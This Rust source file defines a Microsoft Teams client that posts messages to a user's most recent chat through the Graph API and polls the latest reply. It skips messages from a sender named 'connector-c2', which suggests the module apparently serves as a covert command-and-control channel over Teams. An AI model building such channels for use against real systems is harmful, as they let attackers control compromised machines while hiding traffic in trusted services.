use reqwest::Client;
use serde::{Deserialize, Serialize};
use std::error::Error;
use crate::auth::AuthToken;

pub struct TeamsClient {
    client: Client,
    token: AuthToken,
    chat_id: String,
}

#[derive(Deserialize)]
struct ChatResponse {
    value: Vec<Chat>,
}

#[derive(Deserialize)]
struct Chat {
    id: String,
}

#[derive(Serialize)]
struct MessageBody {
    body: MessageContent,
}

#[derive(Serialize)]
struct MessageContent {
    content: String,
    #[serde(rename = "contentType")]
    content_type: String,
}

impl TeamsClient {
    pub async fn new(token: AuthToken) -> Result<Self, Box<dyn Error>> {
        let client = Client::new();
        let chat_id = Self::get_chat_id(&client, &token.access_token).await?;
        
        Ok(Self { client, token, chat_id })
    }

    pub fn is_token_valid(&self) -> bool {
        self.token.is_valid()
    }

    pub async fn update_token(&mut self, token: AuthToken) -> Result<(), Box<dyn Error>> {
        self.token = token;
        self.chat_id = Self::get_chat_id(&self.client, &self.token.access_token).await?;
        Ok(())
    }

    async fn get_chat_id(client: &Client, token: &str) -> Result<String, Box<dyn Error>> {
        let response = client
            .get("https://graph.microsoft.com/v1.0/me/chats?$orderby=lastMessagePreview/createdDateTime desc")
            .header("Authorization", format!("Bearer {}", token))
            .send()
            .await?
            .error_for_status()?
            .json::<ChatResponse>()
            .await?;

        response.value.first()
            .map(|chat| chat.id.clone())
            .ok_or_else(|| "No chats found".into())
    }

    pub async fn send_message(&self, content: &str) -> Result<(), Box<dyn Error>> {
        let url = format!(
            "https://graph.microsoft.com/v1.0/chats/{}/messages",
            self.chat_id
        );

        let body = MessageBody {
            body: MessageContent {
                content: content.to_string(),
                content_type: "text".to_string(),
            },
        };

        self.client
            .post(&url)
            .header("Authorization", format!("Bearer {}", self.token.access_token))
            .json(&body)
            .send()
            .await?
            .error_for_status()?;

        Ok(())
    }

    pub async fn get_latest_message(&self) -> Result<Option<String>, Box<dyn Error>> {
        let url = format!(
            "https://graph.microsoft.com/v1.0/chats/{}/messages?$top=1&$orderby=createdDateTime desc",
            self.chat_id
        );

        let response = self.client
            .get(&url)
            .header("Authorization", format!("Bearer {}", self.token.access_token))
            .send()
            .await?
            .error_for_status()?
            .json::<serde_json::Value>()
            .await?;

        if let Some(messages) = response["value"].as_array() {
            if let Some(message) = messages.first() {
                if let (Some(content), Some(from)) = (
                    message["body"]["content"].as_str(),
                    message["from"]["user"]["displayName"].as_str()
                ) {
                    // Don't process our own messages
                    if from != "connector-c2" {
                        return Ok(Some(content.to_string()));
                    }
                }
            }
        }

        Ok(None)
    }
}